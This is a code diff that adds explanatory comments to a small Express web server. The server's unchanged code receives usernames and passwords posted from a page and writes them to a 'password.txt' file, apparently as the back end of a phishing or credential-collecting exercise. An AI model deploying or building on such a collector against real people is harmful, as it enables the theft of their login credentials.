@@ -6,12 +6,18 @@ const fs = require('fs');
 const express = require('express')
 const app = express()
 
+//for handling HTTP POST requests  
+//body-parser extracts the entire body of an incoming request stream and exposes it on req.body 
 const bp = require('body-parser')
+
+//parses incoming request bodies in a middleware
 app.use(bp.json())
+// URL-encoded requests.
+// extended: true precises that the req.body object will contain values of any type instead of just strings.
 app.use(bp.urlencoded({ extended: true }))
 
 
-
+// The app.get() function routes the HTTP GET Requests to the path which is being specified with the specified callback functions.
 app.get('/', (req, res) => {
     // Print message to the server side
     console.log('The client tried to enter a website.');
@@ -21,9 +27,10 @@ app.get('/', (req, res) => {
 
 
 
+// The app.post() function routes the HTTP POST requests to the specified path with the specified callback functions
 app.post('/password',  (req, res) => {
     // In POST request the information is in the body
-    // The information in our case is the password that the client entered
+    // pull the password and the username that the client entered form the body
     var password = req.body.password;
     var username = req.body.username;
     //Write the given password in the 'password.txt' file & Print a message in the server side
@@ -35,10 +42,7 @@ app.post('/password',  (req, res) => {
 
 
 
-
-
-  
-
 app.listen(8080, () => {
     console.log(`WebServer is up. Listening at http://localhost:8080`);
+
 })
